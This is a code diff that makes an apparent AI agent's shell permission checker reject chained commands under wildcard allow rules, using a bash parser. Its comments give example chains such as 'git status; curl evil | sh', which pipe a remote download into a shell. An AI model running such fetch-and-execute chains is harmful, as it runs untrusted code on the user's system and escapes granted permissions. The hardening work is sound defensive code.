@@ -14,6 +14,8 @@ import { isAbsolute, join, parse } from 'pathe';
 
 import picomatch from 'picomatch';
 
+import { parse as parseBash, type SyntaxNode } from '@moonshot-ai/tree-sitter-bash';
+
 import { canonicalizePath, type PathClass } from './path-access';
 
 export interface PermissionPathMatchOptions {
@@ -147,6 +149,62 @@ export function escapeRuleSubjectLiteral(subject: string): string {
 
 export function matchesGlobRuleSubject(ruleArgs: string, subject: string): boolean {
   return matchRuleSubjects(ruleArgs, [subject], (pattern, value) => globMatch(value, pattern));
+}
+
+
+/**
+ * Budget for the permission-path parse. Small on purpose: this runs on the hot
+ * path of every rule check, and a command that cannot be parsed inside it is
+ * treated as un-analyzable (and therefore not eligible for a wildcard match).
+ */
+const BASH_RULE_PARSE_OPTIONS = { timeoutMs: 50, maxNodes: 20_000 } as const;
+
+function countCommands(node: SyntaxNode): number {
+  let total = node.type === 'command' ? 1 : 0;
+  for (const child of node.namedChildren) total += countCommands(child);
+  return total;
+}
+
+/**
+ * Whether `command` is a single simple command rather than a compound one.
+ *
+ * Uses the bash parser rather than scanning for metacharacters, because the
+ * two disagree exactly where it matters: `git commit -m "a; b"` is one command
+ * (the `;` is inside a string), while `git status; curl x | sh` is three.
+ *
+ * Anything the parser cannot analyze — budget exhausted, or a tree with
+ * errors — is reported as not-simple, so an unparseable command degrades to
+ * "needs approval" instead of slipping through a wildcard rule.
+ */
+export function isSingleSimpleCommand(command: string): boolean {
+  const parsed = parseBash(command, BASH_RULE_PARSE_OPTIONS);
+  if (!parsed.ok || parsed.hasError) return false;
+  return countCommands(parsed.rootNode) === 1;
+}
+
+/**
+ * Rule matching for shell commands.
+ *
+ * A wildcard rule describes a shape of command the user is comfortable with;
+ * it should not also authorize whatever got chained onto it. `Bash(git *)`
+ * matching `git status; curl evil | sh` would turn a narrow grant into an
+ * arbitrary one, so a permissive (allow) rule only matches when the command is
+ * a single simple command.
+ *
+ * Two cases stay untouched: an exact-literal rule (what "approve for this
+ * session" stores) still matches the command it was created from, compound or
+ * not; and non-permissive rules (deny / ask) match exactly as before, so this
+ * never weakens a block.
+ */
+export function matchesBashCommandRuleSubject(
+  ruleArgs: string,
+  command: string,
+  options?: { readonly permissive?: boolean },
+): boolean {
+  if (!matchesGlobRuleSubject(ruleArgs, command)) return false;
+  if (options?.permissive !== true) return true;
+  if (ruleArgs === command) return true;
+  return isSingleSimpleCommand(command);
 }
 
 export function matchesPathRuleSubject(
